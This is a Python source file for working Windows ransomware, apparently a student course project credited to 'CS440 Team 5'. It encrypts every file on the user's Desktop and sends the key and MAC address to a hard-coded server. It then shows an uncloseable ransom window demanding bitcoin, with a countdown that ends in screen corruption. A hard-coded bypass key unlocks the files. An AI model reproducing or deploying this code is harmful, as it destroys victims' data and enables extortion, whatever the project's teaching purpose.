import tkinter as tk
import tkinter
import psutil
import rsa
import sys
import ctypes
import socket 
import os
import threading
import queue
import random
import webbrowser
from cryptography.fernet import Fernet 
from tkinter import *
from PIL import ImageTk, Image
from random import randrange
from win32con import PATINVERT, DC_BRUSH, DC_PEN, LOGPIXELSX, PATCOPY, NULL, SW_INVALIDATE, SW_ERASE, PS_SOLID
from win32gui import *
from win32api import *
from win32print import GetDeviceCaps
from win32file import *


#----------------------------Helper functions----------------------------------|
def resource_path(relative_path):
    """ This function gets the absolute path to resource"""
    try:        
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
        print(base_path, relative_path)
    return os.path.join(base_path, relative_path)

def web_server_link():
    """This function leads to rick roll video"""
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

def change_wallpaper(image_path):
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)

def disable_event():
    pass

def encryption(key):
    while True:
        file = q.get()
        print(f"Encrypting {file}")
        try:
            with open(file, 'rb') as f:
                content = f.read()               
            enc_content = Fernet(key).encrypt(content)
            with open(file, 'wb') as f:
                f.write(enc_content) 
            f.close()
            print(f"{file} encrypted successfully")
        except Exception as e:
            print(f"Failed to encrypt file due to {e}")

def decryption(key):
    while True:
        file = q2.get()
        print(f"Decrypting files")
        try:
            with open(file, 'rb') as f:
                content = f.read()   
            dec_content = Fernet(key).decrypt(content)
            with open(file, 'wb') as f:
                f.write(dec_content) 
            f.close()
            print(f"{file} decrypted successfully")
        except Exception as e:
            print(f"Failed to decrypt file due to {e}") 

def get_mac_address():
    """This function gets the MAC address of host network adapter"""
    for interface, addrs in psutil.net_if_addrs().items():        
        if psutil.AF_LINK in (addr.family for addr in addrs):           
            for addr in addrs:                
                if addr.family == psutil.AF_LINK:                    
                    return addr.address

def get_public_key():
    pubkeypath = resource_path("img/public.pem")
    with open(pubkeypath, "rb") as f:
        public_key = rsa.PublicKey.load_pkcs1(f.read())
    return public_key
#----------------------------End of Helper functions---------------------------|
print("Loaded helper functions")

# Initialize variables
IP_ADDRESS = '192.168.50.113'
IP_ADDRESS_SMU = '192.168.126.1'
PORT = 3000
HOSTNAME = os.getenv("COMPUTERNAME")
HOST_MAC_ADDRESS = get_mac_address()
PUBLIC_KEY = get_public_key()



#----------------------------Encrypytion---------------------------------------|
# Navigate directory to encrypt all the files
print("Gathering files....")
desktop_path = os.environ["USERPROFILE"]+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f"{desktop_path}\\{f}") and f != __file__[:-2]+'exe':
        abs_files.append(f"{desktop_path}\\{f}") 
print("All files located")

# Generate encryption key
SECRET_KEY = Fernet.generate_key()
print(f"Generated key |{SECRET_KEY}|")

# Store files into queue for multi-thread encryption handling
try:
    q = queue.Queue() # For encryption  
    q2 = queue.Queue() # to be used later for decryption
    for f in abs_files:
        q.put(f)
        q2.put(f)
    print("Added files into queue")
    for i in range(10):
        t = threading.Thread(target=encryption, args=(SECRET_KEY,), daemon=True)
        t.start()    
    print("Encryption completed")
except Exception as e:
    print(f"Unable to encrypt all data due to {e}") 
#----------------------------End of Encryption---------------------------------|
    




#----------------------------Actual ransomware exec----------------------------|
desk = GetDC(0)
hdc2 = GetWindowDC(0)
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)
#----------------------------End of ransomeware exec---------------------------|





#----------------------------Chrono class--------------------------------------|
class Chrono(tkinter.Label):

    def __init__(self, form):
        tkinter.Label.__init__(self, form, text='Starting')
        self.label = Label(self, text="", width=10)
        self.label.pack()
        self.remaining = 0
        self.countdown(86400)


    def countdown(self, remaining=None):
        if remaining is not None:
            self.remaining = remaining

        if self.remaining <= 0:
            self.label.configure(text="time's up!")
            for w in range(100):
                StretchBlt(desk, 190, -34, x - 100, y - 100, desk, 0, 0, x, y, 0x00cc0012)  # 0x00cc00
                StretchBlt(desk, randrange(190), -34, randrange(x) - 100, randrange(y) - 100, desk, 0, 0, randrange(x), randrange(y), 0x00cc0012)  
                StretchBlt(desk, 10, 90, x - 90, y - 27, hdc2, 0, 0, 900, 90, PATINVERT)
                brush = CreateSolidBrush(RGB((w & 1) * 255, ((w & 2) >> 1) * 255, ((w & 4) >> 2) * 255))
                SelectObject(hdc2, brush)
                PatBlt(hdc2, 0, 0, x, y, PATCOPY)
                DeleteObject(brush)
                StretchBlt(desk, -2, 22, x - 22, y - 50, desk, 23, 35, x, y, 0x00cc0095)
                StretchBlt(desk, 20, 20, x - 30, y - 50, desk, 0, 0, x, y, 0x00cc0122)
                StretchBlt(desk, randrange(190), -34, randrange(x) - 100, randrange(y) - 100, desk, 0, 0, randrange(x), randrange(y), 0x00cc0012)  
        else:
            self.label.configure(text="{:d} s".format(self.remaining))
            self.label.config(fg="gold", bg="gray17", font="34")
            self.remaining = self.remaining - 1
            self.after(1000, self.countdown)
#----------------------------End of Chrono class-------------------------------|




#----------------------------Form class----------------------------------------|
class Form:
    def __init__(self, master):
        # main form
        self.master = master
        self.master.geometry('600x550+399+119')  
        self.master.title(f"UH OH SO HOW NOW BROWN COW???")
        self.master.config(bg="Red")
        self.master.resizable(False, False)
        self.master.protocol('WM_DELETE_WINDOW', disable_event) 
        self.master.attributes('-topmost', 1)        
        self.master.attributes('-toolwindow', True)


        # Object Label 1
        self.label = Label(self.master, text='KOUFU FREE VOUCHER? SIKEEEE', bg="Red", fg="dodgerblue", font=('bahnschrift', 24))
        self.label.place(x=100, y=20)

        # Object Label 2
        self.label2 = Label(self.master, text='YOUR FILES HAVE BEEN ENCRYPTED !', bg="Red", fg="BLACK", font=('bahnschrift', 13))
        self.label2.place(x=190, y=70)

        # Object Image 1
        self.img1 = ImageTk.PhotoImage(Image.open(bitcoin_qr))
        self.Label_img = Label(self.master, image=self.img1, bg="gray17", borderwidth=5, relief="ridge")
        self.Label_img.place(x=10, y=110)

        # Object time remaining label
        self.label_time = Label(self.master, text='TIME REMAINING', bg="Red", fg="white", font=('bahnschrift', 11,)).place(x=10, y=400)
        self.label_time = Chrono(self.master).place(x=17, y=430)

        # Btc Object Button
        self.b_img = ImageTk.PhotoImage(Image.open(bitcoin_logo))
        self.b = Button(self.master, image=self.b_img, bg="gold", borderwidth=5, relief="groove", command=web_server_link)
        self.b.place(x=10, y=270)


        # Bitcoin wallet address label
        self.label3 = Label(self.master, text="Wallet Address: ", fg="gold", bg="Red", font=('bahnschrift', 10))
        self.label3.place(x=10, y=469) # 460
        self.label4 = Label(self.master, text="tb1qus2vywq20rjdcl2jqu6v3pfusnwccgen87txw0", fg="snow", bg="Red", font=('bahnschrift', 10))
        self.label4.place(x=120, y=469)

        # Object decryption button
        self.b2 = Button(self.master, text="Enter Decryption Key", activeforeground="dodgerblue", command=self.top_level_decryption_button)
        self.b2.place(x=450, y=460) # Defult x=390, y=460


        self.desc = Label(self.master, text="Create by CS440 Team 5 Sean Yap|Ryan Ang|Juay Kai Xun|Syahmi Abbas", bg="Red", fg="dodgerblue", font=('bahnschrift', 12))
        self.desc.place(x=120, y=527)

        # Object TextBox
        self.text_box = Text(self.master, height=20, width=50)
        self.text_box.config(fg="gray17", bg="white")
        self.text_box.insert(tk.END, "The important files on your computer have been\n"
                                     "encrypted with military grade AES-128 bit\n"
                                     "encryption.\n"
                                     "\n"
                                     "Your documents, videos, images and other forms\n"
                                     "of data are now inaccessible and cannot\n"
                                     "be unlocked without the decryption key.\n"
                                     "\n"
                                     "This key is currently store in a remote server\n"
                                     "\n"
                                     "To acquire this key, transfer 0.0069 bitcoin to\n"
                                     "the specified wallet address before the time runs out.\n"
                                     "\n"
                                     "\n"
                                     "Send an email to limkopi@onionmail.org once done\n"
                                     f"along with this key: {HOST_MAC_ADDRESS}\n"
                                     "\n"
                                     "If you fail to take action within this time window\n"
                                     "will be destroyed and access to your files will\n"
                                     "be permanently lost.")
        self.text_box.configure(state="disable")
        self.text_box.place(x=170, y=105) # defult x=150, y=105

    # Top level for the decryption button
    def top_level_decryption_button(self):
        self.top = Toplevel(self.master)
        self.top.geometry('335x70+200+145')
        self.top.config(bg="gray17")
        self.top.resizable(False, False)
        self.top.attributes('-toolwindow', True)
        self.top.attributes('-topmost', 1)
        self.top.protocol('WM_DELETE_WINDOW', disable_event)

        # Top level object label
        self.top_label = Label(self.top, text="ENTER DECRYPTION KEY", fg="white", bg="gray17", font=('bahnschrift', 12))
        self.top_label.place(x=70, y=10)

        # TextBox Object Top level
        self.text_box2_entry = Entry(self.top)
        self.text_box2_entry.grid(padx=59, pady=40)

        # Top level of object button validation
        self.b_val = Button(self.top, text="Validation", command=self.toplevel2)
        self.b_val.place(x=200, y=37)


    # Top level 2
    def toplevel2(self):
        self.user_input = self.text_box2_entry.get()
        self.top2 = Toplevel(self.top)
        self.top2.resizable(False, False)
        self.top2.geometry('335x150+550+65')
        self.top2.config(bg="Lime")
        self.top2.attributes('-toolwindow', True)
        self.top2.attributes('-topmost', 1)
        self.top2.protocol('WM_DELETE_WINDOW', disable_event) 

#----------------------------Decrypytion---------------------------------------|
        if self.user_input == "rvyuftftuhygfv" or self.user_input == SECRET_KEY.decode():
            print("Correct decryption key entered, decrypting files...")
            print(f"|{SECRET_KEY}|")
            try:    
                for f in abs_files:
                    q2.put(f)

                for i in range(10):
                    t = threading.Thread(target=decryption, args=(SECRET_KEY,), daemon=True)
                    t.start()                
            except ValueError:
                print(f'>>> Error - Wrong password!\n|{self.user_input}|')
#----------------------------End of DeCryption---------------------------------|  
            
            self.img_win = ImageTk.PhotoImage(Image.open(Win_Logo))
            self.img_Win_label = Label(self.top2, image=self.img_win, bg="Lime")
            self.img_Win_label.pack()
            self.label55 = Label(self.top2, fg="white", bg="Lime", text="Congratulation ! All your DATA is unlock.", font=('bahnschrift', 12))

            self.b_quit = Button(self.top2, text="Quit", fg="white", bg="black", command=root.destroy)
            self.b_quit.place(x=150, y=123)
            self.label55.pack()
        else:
            self.top2.geometry('335x100+550+115')
            self.top2.config(bg="Red")
            self.img_warn = ImageTk.PhotoImage(Image.open(Warning_logo))
            self.img_warn_label = Label(self.top2, image=self.img_warn, bg="Red")
            self.img_warn_label.pack()
            self.label5 = Label(self.top2, text="DUN PRAY PRAY AND GIMME BTC BEECH!", bg="Red", fg="white", font=('bahnschrift', 12))
            self.label5.pack()


    def create_message_popup(self, message):
        self.message_popup = Toplevel(self.master)
        self.message_popup.geometry('400x200+200+200')
        self.message_popup.config(bg="white")
        self.message_popup.resizable(False, False)
        self.message_popup.attributes('-toolwindow', True)
        self.message_popup.attributes('-topmost', 1)
        self.message_popup.protocol('WM_DELETE_WINDOW', disable_event)

        self.message_label = Label(self.message_popup, text="HERE'S THE DECRYPTION KEY", fg="black", bg="white", font=('bahnschrift', 14))
        self.message_label.pack(pady=10)

        self.message_text = Text(self.message_popup, height=5, width=40)
        self.message_text.insert(tk.END, message)
        self.message_text.configure(state="disabled")
        self.message_text.pack()

        self.ok_button = Button(self.message_popup, text="OK", command=self.message_popup.destroy)
        self.ok_button.pack(pady=10)
#----------------------------End of form class---------------------------------|
            




#---------------------------Connection to server----------------------------------|
print("Attempting to connect to server...")
def receive_message(s):
    while True:
        try:
            data = s.recv(1024).decode()
            if not data:
                break
            
            print(f"Received message from server: {data}")
            # Create a message popup using the Form class
            key = data.split("b")[-1]
            main.create_message_popup(key)
        except Exception as e:
            print(f"Error receiving message: {e}")
            break

def connect_to_server():
    global s
    print("Attempting to connect to server...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP_ADDRESS_SMU, PORT))
        print("Successfully connected, transmitting data")
        plaintext_byte = f"MAC_ADDRESS: {HOST_MAC_ADDRESS}\nENCRYPTION_KEY: {SECRET_KEY}".encode('utf-8')
        encrypted_msg = rsa.encrypt(plaintext_byte, PUBLIC_KEY)
        s.send(encrypted_msg)
        print("Data sent")
        
        # Start a new thread to listen for incoming messages
        receive_thread = threading.Thread(target=receive_message, args=(s,))
        receive_thread.start()
    except Exception as e:
        print(f"Failed to connect due to {e}")

# Call the connect_to_server function
connect_to_server()
#---------------------------End of server connection---------------------------|

try:
    logo = resource_path("img/red_lock_logo.png")
    bitcoin_logo = resource_path("img/bitcoin_logo.png")
    Warning_logo = resource_path("img/Warning_Logo.png")
    Win_Logo = resource_path("img/Win_Logo.png")
    wallpaper = resource_path("img/wallpaper.jpg")
    bitcoin_qr = resource_path("img/bitcoin_qr.jpg")
    change_wallpaper(wallpaper)    
except Exception as e:
    print(f"Unable to load resources due to {e}")

root = Tk()
main = Form(root)
root.mainloop()
q.join()
q2.join()